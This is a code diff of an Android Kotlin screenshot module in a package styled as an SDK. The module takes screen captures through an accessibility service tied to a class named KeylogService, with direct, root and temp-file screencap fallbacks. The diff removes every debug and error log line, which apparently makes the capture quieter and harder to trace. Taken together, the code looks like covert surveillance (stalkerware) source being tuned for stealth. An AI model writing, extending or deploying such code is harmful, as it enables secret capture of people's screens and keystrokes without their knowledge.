@@ -3,7 +3,7 @@ package com.openaccess.sdk.service
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
 import android.os.Build
-import android.util.Log
+
 import java.io.ByteArrayOutputStream
 import java.io.File
 import java.util.concurrent.TimeUnit
@@ -22,21 +22,21 @@ class ScreenshotModule(private val context: android.content.Context) {
     }
 
     fun capture(callback: Callback) {
-        Log.d(TAG, "start")
+        
 
         // 1. AccessibilityService screenshot (Android 14+) — most reliable
         if (Build.VERSION.SDK_INT >= 34) {
-            Log.d(TAG, "trying accessibility screenshot")
+            
             val svc = KeylogService.instance
             if (svc != null) {
                 captureAccessibility(callback)
                 return
             }
-            Log.d(TAG, "accessibility service not available")
+            
         }
 
         // 2. Direct screencap via stdout pipe
-        Log.d(TAG, "trying direct screencap")
+        
         val directResult = captureDirect()
         if (directResult != null) {
             val processed = processBytes(directResult)
@@ -44,7 +44,7 @@ class ScreenshotModule(private val context: android.content.Context) {
         }
 
         // 3. Root screencap
-        Log.d(TAG, "trying root screencap")
+        
         val rootResult = captureRoot()
         if (rootResult != null) {
             val processed = processBytes(rootResult)
@@ -52,7 +52,7 @@ class ScreenshotModule(private val context: android.content.Context) {
         }
 
         // 4. Screencap via /data/local/tmp (emulator workaround)
-        Log.d(TAG, "trying tmp screencap")
+        
         val tmpResult = captureViaTmp()
         if (tmpResult != null) {
             val processed = processBytes(tmpResult)
@@ -77,10 +77,10 @@ class ScreenshotModule(private val context: android.content.Context) {
             if (proc.exitValue() != 0) return null
             val bytes = proc.inputStream.readBytes()
             if (bytes.isEmpty() || bytes.size < 100) return null
-            Log.d(TAG, "direct screencap: ${bytes.size} bytes")
+            
             bytes
         } catch (e: Exception) {
-            Log.e(TAG, "Direct failed: ${e.message}")
+            
             null
         }
     }
@@ -95,10 +95,10 @@ class ScreenshotModule(private val context: android.content.Context) {
             if (proc.exitValue() != 0) return null
             val bytes = proc.inputStream.readBytes()
             if (bytes.isEmpty() || bytes.size < 100) return null
-            Log.d(TAG, "root screencap: ${bytes.size} bytes")
+            
             bytes
         } catch (e: Exception) {
-            Log.e(TAG, "Root failed: ${e.message}")
+            
             null
         }
     }
@@ -118,10 +118,10 @@ class ScreenshotModule(private val context: android.content.Context) {
             val bytes = tmpFile.readBytes()
             tmpFile.delete()
             if (bytes.isEmpty() || bytes.size < 100) return null
-            Log.d(TAG, "tmp screencap: ${bytes.size} bytes")
+            
             bytes
         } catch (e: Exception) {
-            Log.e(TAG, "Tmp failed: ${e.message}")
+            
             null
         }
     }
@@ -182,7 +182,7 @@ class ScreenshotModule(private val context: android.content.Context) {
             if (resized !== bmp) resized.recycle()
             out.toByteArray()
         } catch (e: Exception) {
-            Log.e(TAG, "processBytes: ${e.message}, returning raw")
+            
             data
         }
     }
